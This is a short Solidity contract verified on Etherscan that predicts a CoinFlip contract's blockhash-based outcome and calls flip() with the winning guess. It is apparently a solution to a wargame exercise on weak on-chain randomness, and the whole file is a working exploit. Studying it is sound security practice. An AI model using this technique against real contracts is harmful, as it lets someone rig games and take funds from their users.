/**
 *Submitted for verification at Etherscan.io on 2022-11-29
*/

pragma solidity ^0.8.0;

abstract contract CoinFlipInterface
{
   function flip(bool _guess) public virtual returns (bool);
}

contract CoinFlipHelper {

  uint FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  CoinFlipInterface coinFlipContract = CoinFlipInterface(0x68D0acf4b07871adFe52be73D9118238c105ef2C);

  function setCoinFlipContract(uint160 _address) public
  {
    coinFlipContract = CoinFlipInterface(address(_address));
  }

  function correctGuess() public
  {
      uint coinFlip = uint(blockhash(block.number - 1)) / FACTOR;      
      bool side = coinFlip == 1 ? true : false;
      coinFlipContract.flip(side);
  }
}